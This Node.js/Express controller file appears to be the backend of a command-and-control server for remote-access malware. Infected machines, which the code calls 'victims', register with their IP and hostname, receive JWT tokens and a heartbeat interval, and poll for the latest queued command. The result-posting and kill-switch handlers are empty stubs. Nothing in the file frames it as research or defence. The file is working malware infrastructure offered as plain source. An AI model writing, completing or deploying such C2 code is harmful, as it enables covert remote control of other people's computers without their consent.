const mongodb = require("../models/mongodb");
const helper = require("../helpers/common");
const sanitize = require("mongo-sanitize");
const authMiddleware = require("../middleware/authMiddleware");

async function initialHandshake(req, res) {
	const ipv4 = req.ip;
	const currentDate = helper.getCurrentDate();
	const victimHostname = sanitize(req.body["hostname"]);
	const victimDescription = sanitize(req.body["description"]);

	if (!victimHostname) {
		return res.send({ status: false, message: "Broken request" });
	} else {
		const record = new mongodb.Admins({
			ipv4: ipv4,
			victimHostname: victimHostname,
			victimDescription: victimDescription,
			handshakeDate: currentDate,
			heartBeatInterval: 60, // in seconds
		});

		await record
			.save()
			.then(async () => {
				console.log("New victim joined !");
				const refreshToken = await authMiddleware.generateRefreshToken(
					record._id,
					"victim",
				);
				const jwtToken = authMiddleware.generateJwtToken(record._id, "victim");

				return res
					.status(200)
					.send({ status: true, jwtToken, refreshToken, username: record._id });
			})
			.catch((err) => {
				console.log(err);
				return res
					.status(500)
					.send({ status: false, message: "Unknown error" });
			});
	}
}

async function getCmd(req, res) {
	const username = req.username;

	const filterVictim = { victimId: username }; // desired filter criteria

	const victimCmdList = await mongodb.VictimCommands.find(filterVictim)
		.sort({ timestamp: -1 }) // Sort in descending order based on timestamp
		.limit(1) // Limit the result to 1 record (the latest one)
		.exec();

	if (victimCmdList.length > 0) {
		const latestCmd = victimCmdList[0];
		return res.status(200).send({
			status: true,
			latestCmd,
		});
	} else {
		console.log("No commands found for the victim.");
		return res.status(200).send({
			status: false,
			message: "No commands found for the victim.",
		});
	}
}

function postResult(req, res) {
	const username = req.username;
}

function killSwitch(req, res) {
	const username = req.username;
}

const refresh = async (req, res) => {
	const refreshToken = req.body.refreshToken;
	const username = req.body.username;

	if (!refreshToken || refreshToken == undefined) {
		return res.send({ message: "No Token Provided!" });
	}
	await authMiddleware.verifyRefreshToken(refreshToken, username, res);
};

module.exports = {
	initialHandshake,
	getCmd,
	postResult,
	killSwitch,
	refresh,
};
